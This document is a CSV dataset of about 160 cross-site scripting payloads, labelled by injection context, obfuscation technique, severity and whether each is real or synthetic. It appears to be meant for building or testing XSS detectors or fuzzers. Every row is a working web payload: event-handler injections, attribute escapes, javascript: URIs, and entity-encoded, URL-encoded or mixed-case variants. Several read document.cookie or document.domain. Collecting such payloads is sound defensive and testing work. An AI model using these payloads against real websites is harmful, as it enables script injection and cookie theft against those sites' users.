payload,context,technique,severity,length,source
"<blink onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</blink>",event_handler,none,medium,67,real
"""><Svg onTogGle=coNfiRm('XSS')>",tag_injection,synthetic,medium,31,synthetic
"<style draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</style>",event_handler,none,medium,68,real
"<style>:target {transform: rotate(180deg);}</style><title id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></title>",event_handler,none,medium,128,real
"<div draggable=""true"" contenteditable>drag me</div><button ondragover=alert(1) contenteditable style=display:block>drop here</button>",event_handler,none,medium,133,real
<svg><bdo onload=alert(1)></bdo>,event_handler,none,medium,32,real
"<spacer draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</spacer>",event_handler,none,medium,65,real
' onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) ',attribute_escape,synthetic,medium,69,synthetic
&lt;!--&#91;if gte IE 4&#93;&gt;,generic,html_entity,low,32,real
"<command onmouseleave=""alert(1)"">AnonKryptiQuz</command>",event_handler,none,medium,56,real
<svg ontoggle=console.log(document.domain)>,tag_injection,synthetic,medium,43,synthetic
"<embed oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,99,real
"""`'><script>\xE2\x80\x87javascript:alert(7616)</script>",script_injection,none,medium,55,real
<script onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,57,real
"<hr draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</hr>",event_handler,none,medium,77,real
"<nav onmousemove=""alert(1)"">AnonKryptiQuz</nav>",event_handler,none,medium,47,real
"<object draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</object>",event_handler,none,medium,70,real
prompt(9),generic,none,medium,9,real
"<meta draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</meta>",event_handler,none,medium,84,real
<svg onbegin=console.log(document.cookie)/>,tag_injection,synthetic,medium,43,synthetic
<tfoot onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</tfoot>,event_handler,none,medium,76,real
"<style>:target {color: red;}</style><button id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></button>",event_handler,none,medium,115,real
<svG oNbeGin=prOmpT(lOcaTioN.hAsh)/>,tag_injection,synthetic,medium,36,synthetic
"<menu onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</menu>",event_handler,none,medium,67,real
<svg onbegin=alert(%27XSS%27)>,tag_injection,synthetic,medium,30,synthetic
"""%3E%3Csvg onfocus=console.log(location.hash)%3E",tag_injection,synthetic,medium,48,synthetic
"<rp onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</rp>",event_handler,none,medium,62,real
"<animatetransform onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</animatetransform>",event_handler,none,medium,105,real
"<nextid onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</nextid>",event_handler,none,medium,67,real
"<style>:target {color: red;}</style><article id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></article>",event_handler,none,medium,117,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><custom tags id=x style=""position:absolute;"" onanimationcancel=""print()""></custom tags>",event_handler,none,low,191,real
"<span draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</span>",event_handler,none,medium,86,real
"<image3 onclick=""alert(1)"" style=display:block>AnonKryptiQuz</image3>",event_handler,none,medium,69,real
%27 ontoggle=console.log(location.hash) %27,attribute_escape,synthetic,medium,43,synthetic
<BODY ONLOAD=alert('XSS')>,event_handler,case_variation,medium,26,real
"<rb onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</rb>",event_handler,none,medium,57,real
"<style>:target {transform: rotate(180deg);}</style><style id=x style=""transition:transform 2s"" ontransitionrun=print()></style>",event_handler,none,low,127,real
<tr onpointerleave=alert(1) style=display:block>AnonKryptiQuz</tr>,event_handler,none,medium,66,real
<blockquote id=x tabindex=1 ondeactivate=alert(1)></blockquote><input id=y autofocus>,event_handler,none,medium,85,real
"<h1 onmouseleave=""alert(1)"">AnonKryptiQuz</h1>",event_handler,none,medium,46,real
<button popovertarget=x>Click me</button><menuitem ontoggle=alert(1) popover id=x>AnonKryptiQuz</menuitem>,event_handler,none,medium,106,real
%3F%20<script>prompt(document.domain)</script>,script_injection,url_encoding,medium,46,real
""" onmous&#101;ov&#101;r=confirm(1) """,attribute_escape,synthetic,medium,36,synthetic
%3Csvg ontoggle=console.log(document.domain)%3E,tag_injection,synthetic,medium,47,synthetic
"<main onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</main>",event_handler,none,medium,84,real
""" oNfoCus=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83)) """,attribute_escape,synthetic,medium,54,synthetic
<rt onblur=alert(1) tabindex=1 id=x></rt><input autofocus>,event_handler,none,medium,58,real
""" onload=console.log(1) """,attribute_escape,synthetic,medium,25,synthetic
"<div draggable=""true"" contenteditable>drag me</div><dl ondrop=alert(1) contenteditable style=display:block>drop here</dl>",event_handler,none,medium,121,real
"<spacer onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</spacer>",event_handler,none,medium,87,real
<blockquote onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</blockquote><input value=clickme>,event_handler,none,medium,111,real
"<multicol onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</multicol>",event_handler,none,medium,89,real
<svg ontoggl&#101;=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)/>,tag_injection,synthetic,medium,61,synthetic
<svg onfocus=console.log('XSS')/>,tag_injection,synthetic,medium,33,synthetic
%22><svg onmouseenter=prompt(%27XSS%27)>,tag_injection,synthetic,medium,40,synthetic
"' onmous&#101;&#101;nt&#101;r=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape,synthetic,medium,88,synthetic
<s onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,51,real
"<fieldset draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</fieldset>",event_handler,none,medium,74,real
"<progress draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</progress>",event_handler,none,medium,94,real
"<style>@keyframes slidein {}</style><rtc style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></rtc>",event_handler,none,medium,160,real
"<script>console.log(""Test XSS from the search bar of page XYZ\n"".concat(document.domain).concat(""\n"").concat(window.origin))</script>",script_injection,none,low,133,real
"<div draggable=""true"" contenteditable>drag me</div><code ondragover=alert(1) contenteditable>drop here</code>",event_handler,none,medium,109,real
document.write(%22<img src=x onerror=confirm(%27XSS%27)>%22),dom_sink,synthetic,medium,60,synthetic
"<IMG SRC=""javascript:alert('AnonKryptiQuz');"">",js_uri,case_variation,medium,46,real
"<object draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</object>",event_handler,none,medium,65,real
"<hgroup draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</hgroup>",event_handler,none,medium,70,real
"<strong onmousemove=""alert(1)"">AnonKryptiQuz</strong>",event_handler,none,medium,53,real
<cite onpointerdown=alert(1) style=display:block>AnonKryptiQuz</cite>,event_handler,none,medium,69,real
"<legend draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</legend>",event_handler,none,medium,85,real
"<caption id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></caption>",event_handler,none,medium,90,real
"<div draggable=""true"" contenteditable>drag me</div><thead ondrop=alert(1) contenteditable>drop here</thead>",event_handler,none,medium,107,real
"<meta draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</meta>",event_handler,none,medium,66,real
<svg onerror=confirm(1)>,tag_injection,synthetic,medium,24,synthetic
<svG oNfoCus=coNsoLe.Log(loCatIon.haSh)>,tag_injection,synthetic,medium,40,synthetic
"<style>:target {transform: rotate(180deg);}</style><frameset id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></frameset>",event_handler,none,medium,134,real
<optgroup onblur=alert(1) tabindex=1 id=x></optgroup><input autofocus>,event_handler,none,medium,70,real
"<dd onclick=""alert(1)"" style=display:block>AnonKryptiQuz</dd>",event_handler,none,medium,61,real
"<address onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</address>",event_handler,none,medium,70,real
"<address onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></address>",event_handler,none,medium,287,real
%27 onmouseenter=confirm(document.cookie) %27,attribute_escape,synthetic,medium,45,synthetic
%22><svg onbegin=alert(1)>,tag_injection,synthetic,medium,26,synthetic
"<tfoot onmouseover=""alert(1)"">AnonKryptiQuz</tfoot>",event_handler,none,medium,51,real
<rb onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</rb>,event_handler,none,medium,70,real
"<style>:target {color:red;}</style><frameset id=x style=""transition:color 1s"" ontransitionend=alert(1)></frameset>",event_handler,none,medium,114,real
"<style>:target {color: red;}</style><dialog id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dialog>",event_handler,none,medium,115,real
%22 ontoggle=alert(%27XSS%27) %22,attribute_escape,synthetic,medium,33,synthetic
""" oNerRor=alErt(StRinG.fRomChaRCoDe(88,83,83)) """,attribute_escape,synthetic,medium,48,synthetic
%3Csvg onload=console.log(1)/%3E,tag_injection,synthetic,medium,32,synthetic
<center id=x tabindex=1 onbeforedeactivate=alert(1)></center><input autofocus>,event_handler,none,medium,78,real
' on&#101;rror=prompt(docum&#101;nt.dom&#97;in) ',attribute_escape,synthetic,medium,49,synthetic
"""><Svg onBegIn=ProMpt(doCumEnt.coOkiE)>",tag_injection,synthetic,medium,39,synthetic
""" onmouseenter=confirm(1) """,attribute_escape,synthetic,medium,27,synthetic
<svG oNclIck=prOmpT(dOcuMenT.dOmaIn)>,tag_injection,synthetic,medium,37,synthetic
>'><details/open/ontoggle=confirm('AnonKryptiQuz')>,event_handler,none,medium,51,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><nextid id=x style=""position:absolute;"" onanimationcancel=""print()""></nextid>",event_handler,none,low,181,real
"<link draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</link>",event_handler,none,medium,86,real
<ruby onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</ruby><input value=clickme>,event_handler,none,medium,108,real
<script>/x/prompt(docum&#101;nt.cooki&#101;)</script>,script_injection,synthetic,medium,53,synthetic
"""%3E%3Csvg onload=alert(document.domain)%3E",tag_injection,synthetic,medium,43,synthetic
"<nobr onmouseenter=""alert(1)"">AnonKryptiQuz</nobr>",event_handler,none,medium,50,real
"<picture draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</picture>",event_handler,none,medium,90,real
"<animate onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</animate>",event_handler,none,medium,75,real
"<label ondblclick=""alert(1)"">AnonKryptiQuz</label>",event_handler,none,medium,50,real
<img srcset=validimage.png onload=alert(1)>,event_handler,none,medium,43,real
"<header onclick=""alert(1)"" style=display:block>AnonKryptiQuz</header>",event_handler,none,medium,69,real
"<tfoot oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</tfoot>",event_handler,none,medium,62,real
<var contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,57,real
"&lt;STYLE TYPE=\""text/javascript\""&gt;alert('XSS');&lt;/STYLE&gt;",generic,none,medium,65,real
<svg onerror=confirm('XSS')/>,tag_injection,synthetic,medium,29,synthetic
%22><svg onclick=confirm(%27XSS%27)>,tag_injection,synthetic,medium,36,synthetic
"<footer onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</footer>",event_handler,none,medium,67,real
<source onpointerenter=alert(1) style=display:block>AnonKryptiQuz</source>,event_handler,none,medium,74,real
"<dir onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</dir>",event_handler,none,medium,82,real
<u id=x tabindex=1 onbeforeactivate=alert(1)></u>,event_handler,none,medium,49,real
<head onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</head>,event_handler,none,medium,74,real
"<dialog onmouseover=""alert(1)"">AnonKryptiQuz</dialog>",event_handler,none,medium,53,real
<object/data=javascript:alert()>,js_uri,none,medium,32,real
%22 onfocus=confirm(location.hash) autofocus=%22,attribute_escape,synthetic,medium,48,synthetic
"""%3balert`AnonKryptiQuz`%3b""",generic,url_encoding,low,28,real
%22><svg onmouseenter=confirm(1)>,tag_injection,synthetic,medium,33,synthetic
<script>/x/consol&#101;.log('XSS')</script>,script_injection,synthetic,medium,43,synthetic
"<iframe src=""javascript:document.vulnerable=true; <",js_uri,none,low,51,real
"<details oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,101,real
' onmouseenter=alert(1) ',attribute_escape,synthetic,medium,25,synthetic
<script>\u0061lert`location.hash`</script>,script_injection,synthetic,medium,42,synthetic
"<IMG """"""><SCRIPT>alert(""AnonKryptiQuz"")</SCRIPT>"">",script_injection,case_variation,medium,50,real
"<;BASE HREF="";javascript:alert(';XSS';);//"";>;",js_uri,none,medium,46,real
"<footer draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</footer>",event_handler,none,medium,65,real
"<nav onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</nav>",event_handler,none,medium,68,real
"<style>@keyframes slidein {}</style><div style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></div>",event_handler,none,medium,166,real
""" oNfoCus=coNfiRm(StrIng.frOmCHarCodE(88,83,83)) """,attribute_escape,synthetic,medium,50,synthetic
"<style>@keyframes x{}</style><tr style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></tr>",event_handler,none,medium,97,real
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('AnonKryptiQuz')></OBJECT>,js_uri,case_variation,medium,124,real
<svg on onload=(alert)(document.domain)>,event_handler,none,low,40,real
"<img src=x onerror=\x32""javascript:alert(0825)"">",event_handler,none,medium,48,real
"<style>:target {color: red;}</style><blockquote id=x style=""transition:color 10s"" ontransitioncancel=print()></blockquote>",event_handler,none,low,122,real
"<mark onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</mark>",event_handler,none,medium,66,real
"<tt onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</tt>",event_handler,none,medium,65,real
"<IMG SRC=\""jav&#x0D;ascript:alert('XSS');\"">",tag_injection,html_entity|whitespace_obfuscation|case_variation,medium,44,real
"<sup onmouseleave=""alert(1)"">AnonKryptiQuz</sup>",event_handler,none,medium,48,real
"""'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>",script_injection,none,medium,69,real
"<style draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</style>",event_handler,none,medium,88,real
"<tbody onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</tbody>",event_handler,none,medium,68,real
"<DIV STYLE=""width: expression(alert('AnonKryptiQuz'));"">",attribute_escape,case_variation,medium,56,real
"<xmp ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</xmp>",event_handler,none,medium,87,real
<img o[%00]nerror=alert(1) src=a>,tag_injection,url_encoding,medium,33,real
"<animatemotion id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></animatemotion>",event_handler,none,medium,102,real
<data onpointerenter=alert(1) style=display:block>AnonKryptiQuz</data>,event_handler,none,medium,70,real
"<hgroup onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</hgroup>",event_handler,none,medium,74,real
%22><svg onmouseenter=alert(1)>,tag_injection,synthetic,medium,31,synthetic
"&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\""javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;alert('AnonKryptiQuz');\""&gt;&#93;&#93;&gt;",generic,html_entity,medium,160,real
"<svg on&#101;rror=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection,synthetic,medium,76,synthetic
%22-confirm(1)-%22,generic,url_encoding,medium,18,real
<svg onclick=confirm(document.cookie)/>,tag_injection,synthetic,medium,39,synthetic
"<td onmousemove=""alert(1)"">AnonKryptiQuz</td>",event_handler,none,medium,45,real
